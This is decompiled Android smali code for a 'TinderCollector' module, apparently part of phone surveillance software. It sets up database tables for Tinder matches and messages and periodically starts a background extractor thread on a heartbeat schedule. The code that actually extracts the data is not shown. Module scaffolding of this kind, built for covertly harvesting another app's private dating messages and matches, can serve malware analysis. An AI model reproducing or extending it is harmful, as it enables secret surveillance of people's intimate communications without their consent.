.class public Lcom/hp/vd/module/custom/TinderCollector;
.super Lcom/hp/vd/module/ModuleAbstract;
.source "TinderCollector.java"


# static fields
.field public static final ATTRIBUTE_MAX_MATCH_DATE:Ljava/lang/String; = "max_match_date"

.field public static final ATTRIBUTE_MAX_MESSAGE_ID:Ljava/lang/String; = "max_message_id"

.field public static final ATTRIBUTE_MAX_READ_MATCH_PER_ITERATION:Ljava/lang/String; = "50"

.field public static final ATTRIBUTE_MAX_READ_MESSAGE_PER_ITERATION:Ljava/lang/String; = "250"

.field public static final ATTRIBUTE_SYNCHRONIZATION_INTERVAL:Ljava/lang/String; = "synchronization_interval"

.field protected static final TAG:Ljava/lang/String; = "TinderCollector"


# instance fields
.field protected extractorThread:Ljava/lang/Thread;

.field protected lastSynchronization:Ljava/lang/Long;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;

.field protected tinderMatchDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/TinderMatchData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected tinderMessageDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/TinderMessageData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 24
    invoke-direct {p0}, Lcom/hp/vd/module/ModuleAbstract;-><init>()V

    const/4 v0, 0x0

    .line 35
    iput-object v0, p0, Lcom/hp/vd/module/custom/TinderCollector;->tinderMatchDao:Lcom/j256/ormlite/dao/Dao;

    .line 36
    iput-object v0, p0, Lcom/hp/vd/module/custom/TinderCollector;->tinderMessageDao:Lcom/j256/ormlite/dao/Dao;

    .line 38
    iput-object v0, p0, Lcom/hp/vd/module/custom/TinderCollector;->extractorThread:Ljava/lang/Thread;

    .line 39
    iput-object v0, p0, Lcom/hp/vd/module/custom/TinderCollector;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 40
    iput-object v0, p0, Lcom/hp/vd/module/custom/TinderCollector;->lastSynchronization:Ljava/lang/Long;

    return-void
.end method


# virtual methods
.method public getModuleData()Lcom/hp/vd/data/ModuleData;
    .locals 3

    .line 46
    new-instance v0, Lcom/hp/vd/data/ModuleData;

    invoke-direct {v0}, Lcom/hp/vd/data/ModuleData;-><init>()V

    const-string v1, "custom"

    .line 48
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->type:Ljava/lang/String;

    .line 49
    sget-object v1, Lcom/hp/vd/module/Constants;->STATUS_ACTIVE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->status:Ljava/lang/Integer;

    .line 50
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->packageName:Ljava/lang/String;

    .line 51
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/TinderCollector;->getModuleName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->name:Ljava/lang/String;

    const/4 v1, 0x2

    .line 52
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    const-string v1, "v2.0"

    .line 53
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->versionCodename:Ljava/lang/String;

    const-string v1, "synchronization_interval=3500;"

    .line 55
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->custom:Ljava/lang/String;

    .line 57
    sget-object v1, Lcom/hp/vd/module/Constants;->EXTERNAL_MODULE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->internal:Ljava/lang/Integer;

    const/16 v1, 0x1b

    .line 59
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    iput-object v2, v0, Lcom/hp/vd/data/ModuleData;->priorityLoad:Ljava/lang/Integer;

    .line 60
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->prioritySynchronization:Ljava/lang/Integer;

    return-object v0
.end method

.method public getModuleName()Ljava/lang/String;
    .locals 1

    const-string v0, "TinderCollector"

    return-object v0
.end method

.method protected hasUpdateIntervalExpired()Z
    .locals 9

    .line 194
    iget-object v0, p0, Lcom/hp/vd/module/custom/TinderCollector;->lastSynchronization:Ljava/lang/Long;

    .line 195
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    const-wide/16 v3, 0x3e8

    div-long/2addr v1, v3

    invoke-static {v1, v2}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v1

    .line 196
    iget-object v2, p0, Lcom/hp/vd/module/custom/TinderCollector;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v3, "synchronization_interval"

    invoke-virtual {v2, v3}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v2

    if-eqz v0, :cond_0

    .line 198
    invoke-virtual {v1}, Ljava/lang/Long;->longValue()J

    move-result-wide v3

    invoke-virtual {v0}, Ljava/lang/Long;->longValue()J

    move-result-wide v5

    sub-long v7, v3, v5

    int-to-long v2, v2

    cmp-long v0, v7, v2

    if-gez v0, :cond_0

    const/4 v0, 0x1

    return v0

    .line 202
    :cond_0
    iput-object v1, p0, Lcom/hp/vd/module/custom/TinderCollector;->lastSynchronization:Ljava/lang/Long;

    const/4 v0, 0x0

    return v0
.end method

.method public initialize()Z
    .locals 5

    .line 102
    iget-object v0, p0, Lcom/hp/vd/module/custom/TinderCollector;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const/4 v1, 0x0

    .line 110
    :try_start_0
    iget-object v2, p0, Lcom/hp/vd/module/custom/TinderCollector;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v2}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v2

    const-class v3, Lcom/hp/vd/data/TinderMatchData;

    invoke-virtual {v2, v3}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getDao(Ljava/lang/Class;)Lcom/j256/ormlite/dao/Dao;

    move-result-object v2

    iput-object v2, p0, Lcom/hp/vd/module/custom/TinderCollector;->tinderMatchDao:Lcom/j256/ormlite/dao/Dao;

    .line 111
    iget-object v2, p0, Lcom/hp/vd/module/custom/TinderCollector;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v2}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v2

    const-class v3, Lcom/hp/vd/data/TinderMessageData;

    invoke-virtual {v2, v3}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getDao(Ljava/lang/Class;)Lcom/j256/ormlite/dao/Dao;

    move-result-object v2

    iput-object v2, p0, Lcom/hp/vd/module/custom/TinderCollector;->tinderMessageDao:Lcom/j256/ormlite/dao/Dao;
    :try_end_0
    .catch Ljava/sql/SQLException; {:try_start_0 .. :try_end_0} :catch_1

    .line 120
    :try_start_1
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/TinderCollector;->getPersistedModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v2

    iput-object v2, p0, Lcom/hp/vd/module/custom/TinderCollector;->moduleData:Lcom/hp/vd/data/ModuleData;
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    const/4 v0, 0x1

    return v0

    :catch_0
    move-exception v2

    const-string v3, "TinderCollector"

    const-string v4, "Exception caught while loading moduleData"

    .line 123
    invoke-interface {v0, v3, v4, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return v1

    :catch_1
    move-exception v2

    const-string v3, "TinderCollector"

    const-string v4, "Exception caught while generating DAOs"

    .line 114
    invoke-interface {v0, v3, v4, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return v1
.end method

.method public install(Ljava/lang/String;)Z
    .locals 3

    .line 68
    iget-object v0, p0, Lcom/hp/vd/module/custom/TinderCollector;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    .line 75
    :try_start_0
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/TinderCollector;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v1

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v1

    invoke-virtual {v1}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getConnectionSource()Lcom/j256/ormlite/support/ConnectionSource;

    move-result-object v1

    .line 77
    const-class v2, Lcom/hp/vd/data/TinderMatchData;

    invoke-static {v1, v2}, Lcom/j256/ormlite/table/TableUtils;->createTable(Lcom/j256/ormlite/support/ConnectionSource;Ljava/lang/Class;)I

    .line 82
    const-class v2, Lcom/hp/vd/data/TinderMessageData;

    invoke-static {v1, v2}, Lcom/j256/ormlite/table/TableUtils;->createTable(Lcom/j256/ormlite/support/ConnectionSource;Ljava/lang/Class;)I
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    .line 96
    invoke-super {p0, p1}, Lcom/hp/vd/module/ModuleAbstract;->install(Ljava/lang/String;)Z

    move-result p1

    return p1

    :catch_0
    move-exception p1

    const-string v1, "TinderCollector"

    const-string v2, "install(): exception caught during creating-second level tables"

    .line 87
    invoke-interface {v0, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    const/4 p1, 0x0

    return p1
.end method

.method public isStarted()Z
    .locals 1

    const/4 v0, 0x0

    return v0
.end method

.method public start()Z
    .locals 8

    .line 140
    iget-object v0, p0, Lcom/hp/vd/module/custom/TinderCollector;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v4

    const-string v0, "TinderCollector"

    const-string v1, "start() called."

    .line 141
    invoke-interface {v4, v0, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 143
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/TinderCollector;->isActivated()Z

    move-result v0

    if-nez v0, :cond_0

    const/4 v0, 0x0

    return v0

    .line 151
    :cond_0
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/TinderCollector;->hasUpdateIntervalExpired()Z

    move-result v0

    const/4 v7, 0x1

    if-ne v0, v7, :cond_1

    return v7

    .line 159
    :cond_1
    iget-object v0, p0, Lcom/hp/vd/module/custom/TinderCollector;->extractorThread:Ljava/lang/Thread;

    if-eqz v0, :cond_2

    iget-object v0, p0, Lcom/hp/vd/module/custom/TinderCollector;->extractorThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->isAlive()Z

    move-result v0

    if-nez v0, :cond_3

    .line 161
    :cond_2
    new-instance v0, Lcom/hp/vd/module/custom/tinder/TinderMultiversionExtractor;

    .line 162
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/TinderCollector;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v2

    iget-object v3, p0, Lcom/hp/vd/module/custom/TinderCollector;->moduleData:Lcom/hp/vd/data/ModuleData;

    iget-object v5, p0, Lcom/hp/vd/module/custom/TinderCollector;->tinderMatchDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v6, p0, Lcom/hp/vd/module/custom/TinderCollector;->tinderMessageDao:Lcom/j256/ormlite/dao/Dao;

    move-object v1, v0

    invoke-direct/range {v1 .. v6}, Lcom/hp/vd/module/custom/tinder/TinderMultiversionExtractor;-><init>(Lcom/hp/vd/context/Context;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;Lcom/j256/ormlite/dao/Dao;Lcom/j256/ormlite/dao/Dao;)V

    .line 169
    new-instance v1, Ljava/lang/Thread;

    const-string v2, "Tinder-Extractor-Thread"

    invoke-direct {v1, v0, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    iput-object v1, p0, Lcom/hp/vd/module/custom/TinderCollector;->extractorThread:Ljava/lang/Thread;

    .line 170
    iget-object v0, p0, Lcom/hp/vd/module/custom/TinderCollector;->extractorThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    :cond_3
    return v7
.end method

.method public startOnHeartbeat()Z
    .locals 1

    const/4 v0, 0x1

    return v0
.end method

.method public stop()Z
    .locals 1

    const/4 v0, 0x1

    return v0
.end method
